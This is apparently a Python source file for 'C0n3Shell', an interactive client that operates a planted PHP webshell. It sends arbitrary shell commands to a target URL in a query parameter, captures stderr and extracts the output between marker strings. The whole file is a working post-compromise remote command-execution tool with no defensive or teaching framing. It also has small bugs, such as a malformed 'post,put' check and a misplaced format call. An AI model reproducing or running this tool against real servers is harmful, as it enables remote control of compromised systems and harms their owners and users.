import requests
from urllib.parse import quote
from lxml import html
from cmd import Cmd

BANNER = """\033[01;32m\n
          __  _____ _____ _   _  _____   _____ _   _  _____ _      _      __
         / / /  __ \\  _  | \\ | ||____ | /  ___| | | ||  ___| |    | |     \\ \\
 ______ / /  | /  \\/ |/' |  \\| |    / / \\ `--.| |_| || |__ | |    | |      \\ \\ ______
|______< <   | |   |  /| | . ` |    \\ \\  `--. \\  _  ||  __|| |    | |       > >______|
        \\ \\  | \\__/\\ |_/ / |\\  |.___/ / /\\__/ / | | || |___| |____| |____  / /
         \\_\\  \\____/\\___/\\_| \\_/\\____/  \\____/\\_| |_/\\____/\\_____/\\_____/ /_/\033[0m\n
"""



class C0n3Shell(Cmd):

    # Shall we display the raw results ?
    _http_verb = 'get'
    _raw_results=False
    _ignore_certs=None
    _headers=None
    _data=None
    # _Cookies=None
    _options = {
        'url': 'http://localhost/shell.php',
        'attribute':'cmd',
        'raw': False,
        'show_stderr':True,
        'pwd':'',
        'marker':'[c3n0]'
    }

    def __init__(
        self,
        http_verb='get',
        url='http://localhost/shell.php',
        attribute='cmd',
        ignore_certs=False,
        headers=None,
        data=None
        # ,
        # cookies=None
        ):

        self.prompt = 'C0n3 > '
        self._http_verb = http_verb.lower() if http_verb != None and len(http_verb) > 0 else 'get'
        self._options['url']=url
        self._options['attribute']=attribute
        self._ignore_certs=ignore_certs
        self._headers=headers
        self._data=data
        # self._Cookies=cookies
        self.banner()
        Cmd.__init__(self)
        self.showOptions(None)
        self.getPwd()

    def default(self,args):
        self.cmdHandler(args)

    def banner(self):
        print(BANNER)
        print('')

    def cmdHandler(self,cmd):
        if cmd != None and len(cmd)>0 and cmd.startswith('!'):
            # internal commands
            cmdArray = cmd.split(' ')
            intCmd = cmdArray.pop(0)[1:]
            internal_command_handler = self._internal_commands.get(intCmd)
            if callable(internal_command_handler):
                internal_command_handler(self,' '.join(cmdArray))
            else:
                print('[!] Unknown {}'.format(internal_command_handler))
        else:
            print(self.sendToShell(cmd))

    # Send command to webshell and display results
    def sendToShell(self,cmd):
        payload = cmd

        try:
            if self._options['show_stderr']:
                payload = '{} 2>&1'.format(payload)
            if not self._options['raw']:
                payload = 'echo \'{}\';{};echo \'{}\''.format(self._options['marker'],payload,self._options['marker'])

            print('[>] Sending payload: {}'.format(payload))
            response = requests.request(
                self._http_verb,
                '{}?{}={}'.format(self._options['url'],self._options['attribute'],quote(payload)),
                headers=self._headers,
                data=self._data if self._http_verb in ['post,put'] else None
                )
            if response.status_code == 200:
                if self._options['raw']:
                    return response.text
                else:
                    result = response.text
                    try:
                        if result != None and len(result)>0:
                            result = result[result.find(self._options['marker'])+len(self._options['marker'])+1:]
                            result = result[:result.find(self._options['marker'])]
                        return result
                    except:
                        return response.text
            else:
                print('[!] Receive http code {}: {}').format(response.status_code,response.text)


        except Exception as ex:
            print('[!] Error: {}'.format(ex))

    def setOptions(self,args):
        try:
            args = args.split(' ')
            self._options[args[0]] = args[1]
            print('[>] {}: {}'.format(args[0],args[1]))
        except Exception as ex:
            print('[!] Error: {}'.format(ex))
            print('[>] Usage: set option value')

    def showOptions(self,args):
        print('[>] options:')
        for name, value in self._options.items():
            print("\t{}: {}".format(name,value))

    def getPwd(self):
        return ''

    def quitCmd(self,args):
        quit()

    def helpCmd(args):
        print('[?] Help: ')

    _internal_commands = {
        'help': helpCmd,
        'h': helpCmd,
        '?': helpCmd,
        'set':  setOptions,
        'options': showOptions,
        # 'put':  uploadFileCmd,
        # 'get':  downloadFileCmd,
        'quit': quitCmd,
        'q': quitCmd
    }
